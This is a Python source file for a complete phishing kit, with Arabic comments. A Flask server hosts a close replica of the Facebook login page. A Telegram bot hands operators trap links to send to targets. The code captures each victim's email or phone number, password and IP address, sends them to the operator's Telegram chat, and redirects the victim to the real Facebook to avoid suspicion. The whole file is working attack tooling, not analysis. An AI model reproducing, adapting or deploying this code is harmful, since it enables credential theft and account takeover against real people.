import os
import threading
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request, render_template_string, redirect

BOT_TOKEN = os.getenv("BOT_TOKEN")
RAILWAY_URL = "https://daf-production-8df9.up.railway.app"

if not BOT_TOKEN:
    raise ValueError("[-] BOT_TOKEN is missing!")

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ==========================================
# قالب فيسبوك المطابق للأصل بالحرف (تصميم مطابق للصورة الأصلية تماماً)
# ==========================================
FB_PHISH_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى فيسبوك</title>
    <style>
        body {
            background-color: #f0f2f5;
            font-family: Helvetica, Arial, sans-serif;
            direction: rtl;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            min-height: 100vh;
        }
        .header-logo {
            margin-top: 40px;
            margin-bottom: 20px;
            text-align: center;
        }
        .header-logo svg {
            width: 56px;
            height: 56px;
        }
        .card {
            background-color: #ffffff;
            border: none;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            box-sizing: border-box;
            padding: 20px;
            width: 396px;
            max-width: 90%;
            text-align: center;
        }
        .card-title {
            font-size: 16px;
            color: #4b4f56;
            margin-bottom: 16px;
            font-weight: normal;
        }
        .card input {
            border: 1px solid #dddfe2;
            color: #1d2129;
            font-size: 16px;
            padding: 14px 16px;
            margin-bottom: 12px;
            width: 100%;
            border-radius: 6px;
            outline: none;
            box-sizing: border-box;
            background: #fff;
        }
        .card input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        .login-btn {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 20px;
            line-height: 48px;
            padding: 0 16px;
            width: 100%;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 12px;
        }
        .login-btn:hover {
            background-color: #166fe5;
        }
        .forgot-link {
            color: #1877f2;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            display: block;
            margin-bottom: 20px;
        }
        .forgot-link:hover {
            text-decoration: underline;
        }
        hr {
            border: none;
            border-top: 1px solid #dadde1;
            margin: 20px 0;
        }
        .create-btn {
            background-color: #42b72a;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 17px;
            font-weight: bold;
            line-height: 48px;
            padding: 0 16px;
            cursor: pointer;
            display: inline-block;
            text-decoration: none;
        }
        .create-btn:hover {
            background-color: #36a420;
        }
        .footer {
            margin-top: 40px;
            text-align: center;
            font-size: 12px;
            color: #737373;
            width: 100%;
            max-width: 600px;
            padding: 0 20px;
        }
        .footer-langs {
            margin-bottom: 10px;
            display: flex;
            justify-content: center;
            gap: 15px;
            flex-wrap: wrap;
        }
    </style>
</head>
<body>
    <div class="header-logo">
        <!-- شعار فيسبوك الأزرق الدائري الأصلي -->
        <svg viewBox="0 0 36 36" class="a8c37xic" fill="#1877f2" height="56" width="56">
            <path d="M25 3.58A17.42 17.42 0 0 0 19.8 3a11.08 11.08 0 0 0-4.8 1.15 8.71 8.71 0 0 0-3.6 3.32A9.45 9.45 0 0 0 10 12.18v2.92H7.32a.71.71 0 0 0-.71.71v4.38c0 .39.32.71.71.71H10V33a.71.71 0 0 0 .71.71h5.12a.71.71 0 0 0 .71-.71V20.9h4.37a.71.71 0 0 0 .71-.71l.01-4.38a.71.71 0 0 0-.71-.71H16.55v-2.5c0-1.2.3-2.11.9-2.73.6-.62 1.45-.93 2.55-.93a10.23 10.23 0 0 1 2.5.31.71.71 0 0 0 .82-.47l.5-1.55a.71.71 0 0 0-.34-.84z"></path>
        </svg>
    </div>
    
    <div class="card">
        <div class="card-title">تسجيل الدخول إلى فيسبوك</div>
        <form method="POST">
            <input type="text" id="email" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" id="pass" name="pass" placeholder="كلمة السر" required>
            <button type="submit" class="login-btn">تسجيل الدخول</button>
            <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
            <hr>
            <a href="#" class="create-btn">إنشاء حساب جديد</a>
        </form>
    </div>
    
    <div class="footer">
        <div class="footer-langs">
            <span>العربية</span>
            <span>English (UK)</span>
            <span>Français (France)</span>
            <span>Italiano</span>
        </div>
    </div>
</body>
</html>
"""

@app.route('/login.php', methods=['GET', 'POST'])
def fb_trap():
    target_chat_id = request.args.get('id', None)
    if request.method == 'POST':
        # استقبال البيانات الحقيقية من الحقول بدقة
        email = request.form.get('email')
        password = request.form.get('pass')
        source_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        if target_chat_id:
            alert_msg = (
                "🚨 **صيد فيسبوك تم سحبه بنجاح!**\n\n"
                f"👤 **البريد/الهاتف:** `{email}`\n"
                f"🔑 **كلمة السر:** `{password}`\n"
                f"🌐 **عنوان الـ IP:** `{source_ip}`"
            )
            try:
                bot.send_message(target_chat_id, alert_msg, parse_mode="Markdown")
            except Exception as e:
                print(f"[-] Telegram Error: {e}")
                
        # إعادة توجيه الضحية لفيسبوك الحقيقي لمنع الشك
        return redirect("https://www.facebook.com", code=302)
        
    return render_template_string(FB_PHISH_TEMPLATE)

# ==========================================
# واجهة البوت المخصصة لفيسبوك فقط
# ==========================================
def main_menu():
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb_phish")
    )
    return markup

@bot.message_handler(commands=['start', 'panel'])
def start_command(message):
    user_name = message.from_user.first_name
    text = (
        f"⚡ **مرحباً بك يا {user_name} في منصة صيد فيسبوك الاحترافية**\n\n"
        "القالب الآن مطابق تماماً لواجهة فيسبوك الأصلية (الشعار الدائري، التنسيق، وحقول الإدخال).\n"
        "اضغط على الزر أدناه لتوليد رابطك:"
    )
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    
    if call.data == "gen_fb_phish":
        bot.answer_callback_query(call.id, "جاري تجهيز الرابط المُموه...")
        # رابط نظيف ومباشر
        phish_link = f"{RAILWAY_URL}/login.php?id={chat_id}"
        msg = (
            "🎯 **رابط فيسبوك المصيدة جاهز:**\n\n"
            f"`{phish_link}`\n\n"
            "انسخ الرابط وأرسله للهدف. القالب تم إصلاحه بالكامل ليطابق الموقع الأصلي، وأي بيانات يدخلها (بريد أو هاتف أو كلمة سر) ستصلك فوراً."
        )
        bot.send_message(chat_id, msg, parse_mode="Markdown")

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    t = threading.Thread(target=run_flask)
    t.daemon = True
    t.start()
    bot.infinity_polling()
